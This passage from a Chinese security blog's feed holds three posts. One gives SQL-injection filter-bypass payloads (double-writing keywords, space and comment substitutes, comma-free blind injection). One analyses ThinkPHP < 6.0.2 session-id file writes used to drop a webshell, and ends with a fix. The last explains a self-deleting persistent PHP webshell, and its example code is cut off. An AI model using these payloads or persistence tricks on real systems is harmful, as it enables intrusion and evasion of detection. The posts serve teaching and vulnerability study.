variable">$row</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'lastname'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>代码中使用<code>preg_replace()</code>函数对关键字进行替换，并且只进行了一次替换，可以使用双写的方法来绕过</p><p><img src="https://s2.loli.net/2021/12/06/8re1bwIqymoDWfT.png" alt="image-20210919112701612"></p><p><img src="https://s2.loli.net/2021/12/06/a8xFomg9kHOwEBL.png" alt="image-20210919112826428"></p><h2 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span> <span class="token punctuation">(</span><span class="token single-quoted-string string">'config.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$id</span><span class="token operator">=</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"id"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/ /i'</span><span class="token punctuation">,</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'hack'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"SELECT first_name,lastname FROM users WHERE user_id='<span class="token interpolation"><span class="token variable">$id</span></span>';"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$row</span> <span class="token operator">=</span><span class="token function">mysqli_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'firstname'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token single-quoted-string string">':'</span><span class="token punctuation">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'lastname'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当空格被过滤的情况下，可以使用：</p><pre class="line-numbers language-none"><code class="language-none">/**//*!*/%0a%0b%0c%0d%09<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="号绕过"><a href="#号绕过" class="headerlink" title="#号绕过"></a>#号绕过</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span> <span class="token punctuation">(</span><span class="token single-quoted-string string">'config.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$id</span><span class="token operator">=</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"id"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/#/i'</span><span class="token punctuation">,</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'hack'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"SELECT first_name,lastname FROM users WHERE user_id='<span class="token interpolation"><span class="token variable">$id</span></span>';"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$row</span> <span class="token operator">=</span><span class="token function">mysqli_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'firstname'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token single-quoted-string string">':'</span><span class="token punctuation">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'lastname'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>#</code>是注释符，可以用其他注释符绕过</p><pre class="line-numbers language-none"><code class="language-none">--+--`;/**/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="逗号绕过"><a href="#逗号绕过" class="headerlink" title="逗号绕过"></a>逗号绕过</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span> <span class="token punctuation">(</span><span class="token single-quoted-string string">'config.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$id</span><span class="token operator">=</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"id"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/,/i'</span><span class="token punctuation">,</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'hack'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"SELECT first_name,lastname FROM users WHERE user_id='<span class="token interpolation"><span class="token variable">$id</span></span>';"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$row</span> <span class="token operator">=</span><span class="token function">mysqli_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'firstname'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token single-quoted-string string">':'</span><span class="token punctuation">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'lastname'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>逗号无法用替换法绕过，所以需要其他函数来绕过</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token comment">#</span>等价于<span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">)</span>a <span class="token keyword">join</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">2</span><span class="token punctuation">)</span>b<span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>在大多数情况下、需要在盲注中绕过逗号</p><p>使用<code>substr()</code>、<code>mid()</code>这两个语句都可以使用from for来绕过</p><pre class="line-numbers language-none"><code class="language-none">and ascii(mid((database()),1,1))=1#等价于and ascii(mid((database())from 1 for 1))=1#<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="sleep-绕过"><a href="#sleep-绕过" class="headerlink" title="sleep()绕过"></a>sleep()绕过</h2><p><code>sleep()</code>通常使用在盲注的延时注入中</p><p>如果<code>sleep()</code>被ban，我们可以使用<code>benchmark()</code>函数</p><p><img src="https://s2.loli.net/2021/12/06/Zw9IqRPypCtV2OM.png" alt="image-20210919113854700"></p><p>##substr()绕过</p><p><code>substr()</code>通常也在盲注中</p><p>可以用<code>mid()</code>、<code>substring()</code>、<code>left()</code>、<code>right()</code>替换</p><p><img src="https://s2.loli.net/2021/12/06/ECt4DbyGsuKwrQp.png" alt="image-20210919113955639"> </p><p><img src="https://s2.loli.net/2021/12/06/qjAYQkOMnsBKrDy.png" alt="image-20210919114102856"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="学习" scheme="http://h3geeker.top/categories/%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="网络安全" scheme="http://h3geeker.top/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Thinkphp &lt; 6.0.2 session id未作过滤导致getshell</title>
    <link href="http://h3geeker.top/posts/d1a4aa03.html"/>
    <id>http://h3geeker.top/posts/d1a4aa03.html</id>
    <published>2021-11-22T11:42:05.858Z</published>
    <updated>2021-11-22T11:47:46.212Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Thinkphp-lt-6-0-2-session-id未作过滤导致getshell"><a href="#Thinkphp-lt-6-0-2-session-id未作过滤导致getshell" class="headerlink" title="Thinkphp < 6.0.2 session id未作过滤导致getshell"></a>Thinkphp &lt; 6.0.2 session id未作过滤导致getshell</h1><h3 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h3><p>Thinkphp &lt; 6.0.2 session id未作过滤导致getshell</p><h3 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h3><p>Thinkphp &lt; 6.0.2</p><h3 id="三、漏洞分析"><a href="#三、漏洞分析" class="headerlink" title="三、漏洞分析"></a>三、漏洞分析</h3><p>6.0.1在设置<code>session id</code>时未对值进行<code>ctype_alnum()</code>校验，从而导致可以传入任意字符。</p><p>看一下保存session是怎么写的</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> void<span class="token punctuation">{</span>    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">clearFlashData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$sessionId</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">getId</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">data</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">handler</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$sessionId</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">handler</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">delete</span><span class="token punctuation">(</span><span class="token variable">$sessionId</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">init</span> <span class="token operator">=</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>先获取<code>sessionid</code>，然后作为参数传入<code> $this-&gt;handler-&gt;write($sessionId, $data)</code>,<code>$this-&gt;handler</code>在构造函数中被初始化</p><p>跟进查看一下</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> SessionHandlerInterface <span class="token variable">$handler</span><span class="token punctuation">,</span> <span class="token keyword">array</span> <span class="token variable">$serialize</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">name</span>    <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">handler</span> <span class="token operator">=</span> <span class="token variable">$handler</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$serialize</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">serialize</span> <span class="token operator">=</span> <span class="token variable">$serialize</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">setId</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看出<code>$handler</code>的类型是SessionHandlerInterface，全局发现这是一个接口，实现这个接口的类有两个，一个是File，一个是Cache。这里以File类为例，我们跟进它的<code>write()</code>方法</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">write</span><span class="token punctuation">(</span>string <span class="token variable">$sessID</span><span class="token punctuation">,</span> string <span class="token variable">$sessData</span><span class="token punctuation">)</span><span class="token punctuation">:</span> bool<span class="token punctuation">{</span>    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">getFileName</span><span class="token punctuation">(</span><span class="token variable">$sessID</span><span class="token punctuation">,</span> <span class="token boolean constant">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$data</span>     <span class="token operator">=</span> <span class="token variable">$sessData</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">config</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'data_compress'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token function">function_exists</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'gzcompress'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment">//数据压缩</span>        <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">gzcompress</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">writeFile</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里先通过第一个参数（也就是session id）来构造$filename，然后判断是否需要对session数据进行压缩，默认是不需要的，最后return时调用$this-&gt;writeFile()。先看看文件名是如何构造的，跟进$this-&gt;getFileName()</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function">getFileName</span><span class="token punctuation">(</span>string <span class="token variable">$name</span><span class="token punctuation">,</span> bool <span class="token variable">$auto</span> <span class="token operator">=</span> <span class="token boolean constant">false</span><span class="token punctuation">)</span><span class="token punctuation">:</span> string<span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">config</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'prefix'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">config</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'prefix'</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token constant">DIRECTORY_SEPARATOR</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'sess_'</span> <span class="token punctuation">.</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'sess_'</span> <span class="token punctuation">.</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">config</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'path'</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">return</span> <span class="token variable">$filename</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里直接将第一个参数拼接到路径的最后。跟进之前的$this-&gt;writeFile()方法</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function">writeFile</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">:</span> bool<span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>bool<span class="token punctuation">)</span> <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">,</span> <span class="token constant">LOCK_EX</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>这里用到了<code>file_put_contents()</code>保存文件，但是程序未对session id进行危险字符判断。</p><p>所以我们可以利用该漏洞来写入<code>webshell.php</code></p><p>继续往下看</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">handle</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token punctuation">,</span> Closure <span class="token variable">$next</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment">// Session初始化</span>    <span class="token variable">$varSessionId</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">app</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">config</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'session.var_session_id'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$cookieName</span>   <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">session</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$varSessionId</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$request</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">request</span><span class="token punctuation">(</span><span class="token variable">$varSessionId</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$sessionId</span> <span class="token operator">=</span> <span class="token variable">$request</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">request</span><span class="token punctuation">(</span><span class="token variable">$varSessionId</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token variable">$sessionId</span> <span class="token operator">=</span> <span class="token variable">$request</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">cookie</span><span class="token punctuation">(</span><span class="token variable">$cookieName</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$sessionId</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">session</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">setId</span><span class="token punctuation">(</span><span class="token variable">$sessionId</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里的<code>$sessionId</code>的值由<code>$request-&gt;cookie($cookieName)</code>获得，<code>$cookieName</code>经过跟进后发现默认是PHPSESSID</p><p><img src="https://i.loli.net/2021/11/22/94JHfbTUBdLmWwO.png" alt="1"></p><p>所以我们可以设置Cookie中的PHPSESSID的值为xxxxx.php</p><h3 id="四、漏洞复现"><a href="#四、漏洞复现" class="headerlink" title="四、漏洞复现"></a>四、漏洞复现</h3><p>复现之前我们需要开启session</p><p>在<code>\app\middleaware.php</code>中把<code>\think\middleware\SessionInit::class</code>注释取消</p><p><img src="https://i.loli.net/2021/11/22/WxMvc3BH5rlekSK.png" alt="2"></p><p>然后在<code>\app\controller\index.php</code>中加入入口</p><p><img src="https://i.loli.net/2021/11/22/FnbXveG3z5m4d9D.png" alt="3"></p><p>然后bp抓包，构造poc</p><p><img src="https://i.loli.net/2021/11/22/tywnMGX7xaop9BY.png" alt="4"></p><p>发现写入成功了，访问一下写入的文件</p><p><img src="https://i.loli.net/2021/11/22/46VM8OIj5ScA3K1.png" alt="5"></p><h3 id="五、漏洞复现"><a href="#五、漏洞复现" class="headerlink" title="五、漏洞复现"></a>五、漏洞复现</h3><p>1、对session id 加一个过滤，使用ctype_alnum()</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">id</span> <span class="token operator">=</span> <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">32</span> ctype_alnum（<span class="token variable">$id</span>） <span class="token operator">&amp;&amp;</span> <span class="token operator">?</span> <span class="token variable">$id</span> <span class="token punctuation">:</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">microtime</span><span class="token punctuation">(</span><span class="token boolean constant">true</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token function">session_create_id</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2、更新Thinkphp版本</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="CVE复现" scheme="http://h3geeker.top/categories/CVE%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="CVE漏洞复现" scheme="http://h3geeker.top/tags/CVE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>PHP不死马初探</title>
    <link href="http://h3geeker.top/posts/a0ce185.html"/>
    <id>http://h3geeker.top/posts/a0ce185.html</id>
    <published>2021-11-22T11:41:14.069Z</published>
    <updated>2021-11-22T12:00:08.689Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="什么是不死马"><a href="#什么是不死马" class="headerlink" title="什么是不死马"></a>什么是不死马</h1><p><strong>内存马</strong>，通俗讲就是不死马，就是会运行一段永远不退出的程序常驻在PHP进程里，无限执行。</p><h4 id="流程大概为："><a href="#流程大概为：" class="headerlink" title="流程大概为："></a>流程大概为：</h4><p><code>不死马.php</code>–&gt;<code>上传到服务器</code>–&gt;<code>服务器执行</code>–&gt;<code>在服务器上循环生成</code></p><p>用以上流程达到不死的效果</p><h4 id="可用的php函数"><a href="#可用的php函数" class="headerlink" title="可用的php函数"></a>可用的php函数</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token number">1.</span><span class="token function">ignore_user_abort</span><span class="token punctuation">(</span><span class="token boolean constant">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">--</span><span class="token operator">&gt;</span>函数设置与客户机断开是否会终止脚本的执行。这里设置为<span class="token boolean constant">true</span>则忽略与用户的断开，即使与客户机断开脚本仍会执行。<span class="token number">2.</span><span class="token function">set_time_limit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">--</span><span class="token operator">&gt;</span>函数设置脚本最大执行时间。这里设置为<span class="token number">0</span>，即没有时间方面的限制。<span class="token number">3.</span><span class="token function">unlink</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span> <span class="token operator">--</span><span class="token operator">&gt;</span>删除文件本身，以起到隐蔽自身的作用。<span class="token number">4.</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">--</span><span class="token operator">&gt;</span>执行的命令用于修改文件的创建或修改时间，可以绕过“find –name <span class="token single-quoted-string string">'*.php'</span> –mmin <span class="token operator">-</span><span class="token number">10</span>”命令检测最近<span class="token number">10</span>分钟修改或新创建的<span class="token constant">PHP</span>文件，但不一定有用，可选。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="来个简单的例子"><a href="#来个简单的例子" class="headerlink" title="来个简单的例子"></a>来个简单的例子</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">ignore_user_abort</span><span class="token punctuation">(</span><span class="token boolean constant">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//函数设置与客户机断开是否会终止脚本的执行。这里设置为true则忽略与用户的断开，即使与客户机断开脚本仍会执行。</span><span class="token function">set_time_limit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//函数设置脚本最大执行时间。这里设置为0，即没有时间方面的限制。</span><span class="token function">unlink</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token 